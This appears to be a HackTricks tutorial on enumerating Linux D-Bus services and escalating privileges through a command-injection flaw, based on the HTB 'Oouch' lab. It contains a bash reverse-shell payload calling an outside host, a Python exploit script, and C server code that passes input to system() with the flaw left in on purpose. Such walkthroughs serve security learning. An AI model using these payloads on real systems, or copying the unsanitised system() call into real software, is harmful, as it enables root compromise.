# D-Bus Enumeration & Command Injection Privilege Escalation

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## **GUI enumeration**

D-Bus is utilized as the inter-process communications (IPC) mediator in Ubuntu desktop environments. On Ubuntu, the concurrent operation of several message buses is observed: the system bus, primarily utilized by **privileged services to expose services relevant across the system**, and a session bus for each logged-in user, exposing services relevant only to that specific user. The focus here is primarily on the system bus due to its association with services running at higher privileges (e.g., root) as our objective is to elevate privileges. It is noted that D-Bus's architecture employs a 'router' per session bus, which is responsible for redirecting client messages to the appropriate services based on the address specified by the clients for the service they wish to communicate with.

Services on D-Bus are defined by the **objects** and **interfaces** they expose. Objects can be likened to class instances in standard OOP languages, with each instance uniquely identified by an **object path**. This path, akin to a filesystem path, uniquely identifies each object exposed by the service. A key interface for research purposes is the **org.freedesktop.DBus.Introspectable** interface, featuring a singular method, Introspect. This method returns an XML representation of the object's supported methods, signals, and properties, with a focus here on methods while omitting properties and signals.

For communication with the D-Bus interface, two tools were employed: a CLI tool named **gdbus** for easy invocation of methods exposed by D-Bus in scripts, and [**D-Feet**](https://wiki.gnome.org/Apps/DFeet), a Python-based GUI tool designed to enumerate the services available on each bus and to display the objects contained within each service.

```bash
sudo apt-get install d-feet
```

![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png)

![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png)


In the first image services registered with the D-Bus system bus are shown, with **org.debin.apt** specifically highlighted after selecting the System Bus button. D-Feet queries this service for objects, displaying interfaces, methods, properties, and signals for chosen objects, seen in the second image. Each method's signature is also detailed.

A notable feature is the display of the service's **process ID (pid)** and **command line**, useful for confirming if the service runs with elevated privileges, important for research relevance.

**D-Feet also allows method invocation**: users can input Python expressions as parameters, which D-Feet converts to D-Bus types before passing to the service.

However, note that **some methods require authentication** before allowing us to invoke them. We will ignore these methods, since our goal is to elevate our privileges without credentials in the first place.

Also note that some of the services query another D-Bus service named org.freedeskto.PolicyKit1 whether a user should be allowed to perform certain actions or not.

## **Cmd line Enumeration**

### List Service Objects

It's possible to list opened D-Bus interfaces with:

```bash
busctl list #List D-Bus interfaces

NAME                                   PID PROCESS         USER             CONNECTION    UNIT                      SE
:1.0                                     1 systemd         root             :1.0          init.scope                - 
:1.1345                              12817 busctl          qtc              :1.1345       session-729.scope         72
:1.2                                  1576 systemd-timesyn systemd-timesync :1.2          systemd-timesyncd.service - 
:1.3                                  2609 dbus-server     root             :1.3          dbus-server.service       - 
:1.4                                  2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    - 
:1.6                                  2612 systemd-logind  root             :1.6          systemd-logind.service    - 
:1.8                                  3087 unattended-upgr root             :1.8          unattended-upgrades.serv… - 
:1.820                                6583 systemd         qtc              :1.820        user@1000.service         - 
com.ubuntu.SoftwareProperties            - -               -                (activatable) -                         - 
fi.epitest.hostap.WPASupplicant       2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    - 
fi.w1.wpa_supplicant1                 2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    - 
htb.oouch.Block                       2609 dbus-server     root             :1.3          dbus-server.service       - 
org.bluez                                - -               -                (activatable) -                         - 
org.freedesktop.DBus                     1 systemd         root             -             init.scope                - 
org.freedesktop.PackageKit               - -               -                (activatable) -                         - 
org.freedesktop.PolicyKit1               - -               -                (activatable) -                         - 
org.freedesktop.hostname1                - -               -                (activatable) -                         - 
org.freedesktop.locale1                  - -               -                (activatable) -                         - 
```

#### Connections

[From wikipedia:](https://en.wikipedia.org/wiki/D-Bus) When a process sets up a connection to a bus, the bus assigns to the connection a special bus name called _unique connection name_. Bus names of this type are immutable—it's guaranteed they won't change as long as the connection exists—and, more importantly, they can't be reused during the bus lifetime. This means that no other connection to that bus will ever have assigned such unique connection name, even if the same process closes down the connection to the bus and creates a new one. Unique connection names are easily recognizable because they start with the—otherwise forbidden—colon character.

### Service Object Info

Then, you can obtain some information about the interface with:

```bash
busctl status htb.oouch.Block #Get info of "htb.oouch.Block" interface

PID=2609
PPID=1
TTY=n/a
UID=0
EUID=0
SUID=0
FSUID=0
GID=0
EGID=0
SGID=0
FSGID=0
SupplementaryGIDs=
Comm=dbus-server
CommandLine=/root/dbus-server
Label=unconfined
CGroup=/system.slice/dbus-server.service
Unit=dbus-server.service
Slice=system.slice
UserUnit=n/a
UserSlice=n/a
Session=n/a
AuditLoginUID=n/a
AuditSessionID=n/a
UniqueName=:1.3
EffectiveCapabilities=cap_chown cap_dac_override cap_dac_read_search 
        cap_fowner cap_fsetid cap_kill cap_setgid 
        cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service 
        cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock 
        cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot 
        cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot 
        cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config 
        cap_mknod cap_lease cap_audit_write cap_audit_control 
        cap_setfcap cap_mac_override cap_mac_admin cap_syslog 
        cap_wake_alarm cap_block_suspend cap_audit_read
PermittedCapabilities=cap_chown cap_dac_override cap_dac_read_search 
        cap_fowner cap_fsetid cap_kill cap_setgid 
        cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service 
        cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock 
        cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot 
        cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot 
        cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config 
        cap_mknod cap_lease cap_audit_write cap_audit_control 
        cap_setfcap cap_mac_override cap_mac_admin cap_syslog 
        cap_wake_alarm cap_block_suspend cap_audit_read
InheritableCapabilities=
BoundingCapabilities=cap_chown cap_dac_override cap_dac_read_search 
        cap_fowner cap_fsetid cap_kill cap_setgid 
        cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service 
        cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock 
        cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot 
        cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot 
        cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config 
        cap_mknod cap_lease cap_audit_write cap_audit_control 
        cap_setfcap cap_mac_override cap_mac_admin cap_syslog 
        cap_wake_alarm cap_block_suspend cap_audit_read
```

### List Interfaces of a Service Object

You need to have enough permissions.

```bash
busctl tree htb.oouch.Block #Get Interfaces of the service object

└─/htb
  └─/htb/oouch
    └─/htb/oouch/Block
```

### Introspect Interface of a Service Object

Note how in this example it was selected the latest interface discovered using the `tree` parameter (_see previous section_):

```bash
busctl introspect htb.oouch.Block /htb/oouch/Block #Get methods of the interface

NAME                                TYPE      SIGNATURE RESULT/VALUE FLAGS
htb.oouch.Block                     interface -         -            -
.Block                              method    s         s            -
org.freedesktop.DBus.Introspectable interface -         -            -
.Introspect                         method    -         s            -
org.freedesktop.DBus.Peer           interface -         -            -
.GetMachineId                       method    -         s            -
.Ping                               method    -         -            -
org.freedesktop.DBus.Properties     interface -         -            -
.Get                                method    ss        v            -
.GetAll                             method    s         a{sv}        -
.Set                                method    ssv       -            -
.PropertiesChanged                  signal    sa{sv}as  -            -
```

Note the method `.Block` of the interface `htb.oouch.Block` (the one we are interested in). The "s" of the other columns may mean that it's expecting a string.

### Monitor/Capture Interface

With enough privileges (just `send_destination` and `receive_sender` privileges aren't enough) you can **monitor a D-Bus communication**.

In order to **monitor** a **communication** you will need to be **root.** If you still find problems being root check [https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/](https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/) and [https://wiki.ubuntu.com/DebuggingDBus](https://wiki.ubuntu.com/DebuggingDBus)

{% hint style="warning" %}
If you know how to configure a D-Bus config file to **allow non root users to sniff** the communication please **contact me**!
{% endhint %}

Different ways to monitor:

```bash
sudo busctl monitor htb.oouch.Block #Monitor only specified
sudo busctl monitor #System level, even if this works you will only see messages you have permissions to see
sudo dbus-monitor --system #System level, even if this works you will only see messages you have permissions to see
```

In the following example the interface `htb.oouch.Block` is monitored and **the message "**_**lalalalal**_**" is sent through miscommunication**:

```bash
busctl monitor htb.oouch.Block

Monitoring bus message stream.
‣ Type=method_call  Endian=l  Flags=0  Version=1  Priority=0 Cookie=2
  Sender=:1.1376  Destination=htb.oouch.Block  Path=/htb/oouch/Block  Interface=htb.oouch.Block  Member=Block
  UniqueName=:1.1376
  MESSAGE "s" {
          STRING "lalalalal";
  };

‣ Type=method_return  Endian=l  Flags=1  Version=1  Priority=0 Cookie=16  ReplyCookie=2
  Sender=:1.3  Destination=:1.1376
  UniqueName=:1.3
  MESSAGE "s" {
          STRING "Carried out :D";
  };
```

You can use `capture` instead of `monitor` to save the results in a pcap file.

#### Filtering all the noise <a href="#filtering_all_the_noise" id="filtering_all_the_noise"></a>

If there is just too much information on the bus, pass a match rule like so:

```bash
dbus-monitor "type=signal,sender='org.gnome.TypingMonitor',interface='org.gnome.TypingMonitor'"
```

Multiple rules can be specified. If a message matches _any_ of the rules, the message will be printed. Like so:

```bash
dbus-monitor "type=error" "sender=org.freedesktop.SystemToolsBackends"
```

```bash
dbus-monitor "type=method_call" "type=method_return" "type=error"
```

See the [D-Bus documentation](http://dbus.freedesktop.org/doc/dbus-specification.html) for more information on match rule syntax.

### More

`busctl` has even more options, [**find all of them here**](https://www.freedesktop.org/software/systemd/man/busctl.html).

## **Vulnerable Scenario**

As user **qtc inside the host "oouch" from HTB** you can find an **unexpected D-Bus config file** located in _/etc/dbus-1/system.d/htb.oouch.Block.conf_:

```xml
<?xml version="1.0" encoding="UTF-8"?> <!-- -*- XML -*- -->

<!DOCTYPE busconfig PUBLIC
 "-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN"
 "http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd">

<busconfig>

    <policy user="root">
        <allow own="htb.oouch.Block"/>
    </policy>

	<policy user="www-data">
		<allow send_destination="htb.oouch.Block"/>
		<allow receive_sender="htb.oouch.Block"/>
	</policy>

</busconfig>
```

Note from the previous configuration that **you will need to be the user `root` or `www-data` to send and receive information** via this D-BUS communication.

As user **qtc** inside the docker container **aeb4525789d8** you can find some dbus related code in the file _/code/oouch/routes.py._ This is the interesting code:

```python
if primitive_xss.search(form.textfield.data):
        bus = dbus.SystemBus()
        block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
        block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')

        client_ip = request.environ.get('REMOTE_ADDR', request.remote_addr)  
        response = block_iface.Block(client_ip)
        bus.close()
        return render_template('hacker.html', title='Hacker')
```

As you can see, it is **connecting to a D-Bus interface** and sending to the **"Block" function** the "client\_ip".

In the other side of the D-Bus connection there is some C compiled binary running. This code is **listening** in the D-Bus connection **for IP address and is calling iptables via `system` function** to block the given IP address.\
**The call to `system` is vulnerable on purpose to command injection**, so a payload like the following one will create a reverse shell: `;bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #`

### Exploit it

At the end of this page you can find the **complete C code of the D-Bus application**. Inside of it you can find between the lines 91-97 **how the `D-Bus object path`** **and `interface name`** are **registered**. This information will be necessary to send information to the D-Bus connection:

```c
        /* Install the object */
        r = sd_bus_add_object_vtable(bus,
                                     &slot,
                                     "/htb/oouch/Block",  /* interface */
                                     "htb.oouch.Block",   /* service object */
                                     block_vtable,
                                     NULL);
```

Also, in line 57 you can find that **the only method registered** for this D-Bus communication is called `Block`(_**Thats why in the following section the payloads are going to be sent to the service object `htb.oouch.Block`, the interface `/htb/oouch/Block` and the method name `Block`**_):

```c
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
```

#### Python

The following python code will send the payload to the D-Bus connection to the `Block` method via `block_iface.Block(runme)` (_note that it was extracted from the previous chunk of code_):

```python
import dbus
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')
runme = ";bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #"
response = block_iface.Block(runme)
bus.close()
```

#### busctl and dbus-send

```bash
dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:';pring -c 1 10.10.14.44 #'
```

* `dbus-send` is a tool used to send message to “Message Bus”
* Message Bus – A software used by systems to make communications between applications easily. It’s related to Message Queue (messages are ordered in sequence) but in Message Bus the messages are sending in a subscription model and also very quick.
* “-system” tag is used to mention that it is a system message, not a session message (by default).
* “–print-reply” tag is used to print our message appropriately and receives any replies in a human-readable format.
* “–dest=Dbus-Interface-Block” The address of the Dbus interface.
* “–string:” – Type of message we like to send to the interface. There are several formats of sending messages like double, bytes, booleans, int, objpath. Out of this, the “object path” is useful when we want to send a path of a file to the Dbus interface. We can use a special file (FIFO) in this case to pass a command to interface in the name of a file. “string:;” – This is to call the object path again where we place of FIFO reverse shell file/command.

_Note that in `htb.oouch.Block.Block`, the first part (`htb.oouch.Block`) references the service object and the last part (`.Block`) references the method name._

### C code

{% code title="d-bus_server.c" %}
```c
//sudo apt install pkgconf
//sudo apt install libsystemd-dev
//gcc d-bus_server.c -o dbus_server `pkg-config --cflags --libs libsystemd`

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <systemd/sd-bus.h>

static int method_block(sd_bus_message *m, void *userdata, sd_bus_error *ret_error) {
        char* host = NULL;
        int r;

        /* Read the parameters */
        r = sd_bus_message_read(m, "s", &host);
        if (r < 0) {
                fprintf(stderr, "Failed to obtain hostname: %s\n", strerror(-r));
                return r;
        }

        char command[] = "iptables -A PREROUTING -s %s -t mangle -j DROP";

        int command_len = strlen(command);
        int host_len = strlen(host);

        char* command_buffer = (char *)malloc((host_len + command_len) * sizeof(char));
        if(command_buffer == NULL) {
                fprintf(stderr, "Failed to allocate memory\n");
                return -1;
        }

        sprintf(command_buffer, command, host);

        /* In the first implementation, we simply ran command using system(), since the expected DBus
         * to be threading automatically. However, DBus does not thread and the application will hang 
         * forever if some user spawns a shell. Thefore we need to fork (easier than implementing real
         * multithreading)
         */
        int pid = fork();

        if ( pid == 0 ) {
            /* Here we are in the child process. We execute the command and eventually exit. */
            system(command_buffer);
            exit(0);
        } else {
            /* Here we are in the parent process or an error occured. We simply send a genric message. 
             * In the first implementation we returned separate error messages for success or failure.
             * However, now we cannot wait for results of the system call. Therefore we simply return
             * a generic. */
            return sd_bus_reply_method_return(m, "s", "Carried out :D");
        }
        r = system(command_buffer);
}


/* The vtable of our little object, implements the net.poettering.Calculator interface */
static const sd_bus_vtable block_vtable[] = {
        SD_BUS_VTABLE_START(0),
        SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
        SD_BUS_VTABLE_END
};


int main(int argc, char *argv[]) {
        /*
         * Main method, registeres the htb.oouch.Block service on the system dbus.
         *
         * Paramaters:
         *      argc            (int)             Number of arguments, not required
         *      argv[]          (char**)          Argument array, not required
         *
         * Returns:
         *      Either EXIT_SUCCESS ot EXIT_FAILURE. Howeverm ideally it stays alive
         *      as long as the user keeps it alive.
         */


        /* To prevent a huge numer of defunc process inside the tasklist, we simply ignore client signals */
        signal(SIGCHLD,SIG_IGN);

        sd_bus_slot *slot = NULL;
        sd_bus *bus = NULL;
        int r;

        /* First we need to connect to the system bus. */
        r = sd_bus_open_system(&bus);
        if (r < 0) 
        {
                fprintf(stderr, "Failed to connect to system bus: %s\n", strerror(-r));
                goto finish;
        }

        /* Install the object */
        r = sd_bus_add_object_vtable(bus,
                                     &slot,
                                     "/htb/oouch/Block",  /* interface */
                                     "htb.oouch.Block",   /* service object */
                                     block_vtable,
                                     NULL);
        if (r < 0) {
                fprintf(stderr, "Failed to install htb.oouch.Block: %s\n", strerror(-r));
                goto finish;
        }

        /* Register the service name to find out object */
        r = sd_bus_request_name(bus, "htb.oouch.Block", 0);
        if (r < 0) {
                fprintf(stderr, "Failed to acquire service name: %s\n", strerror(-r));
                goto finish;
        }

        /* Infinite loop to process the client requests */
        for (;;) {
                /* Process requests */
                r = sd_bus_process(bus, NULL);
                if (r < 0) {
                        fprintf(stderr, "Failed to process bus: %s\n", strerror(-r));
                        goto finish;
                }
                if (r > 0) /* we processed a request, try to process another one, right-away */
                        continue;

                /* Wait for the next request to process */
                r = sd_bus_wait(bus, (uint64_t) -1);
                if (r < 0) {
                        fprintf(stderr, "Failed to wait on bus: %s\n", strerror(-r));
                        goto finish;
                }
        }

finish:
        sd_bus_slot_unref(slot);
        sd_bus_unref(bus);

        return r < 0 ? EXIT_FAILURE : EXIT_SUCCESS;
}
```
{% endcode %}

## References
* [https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
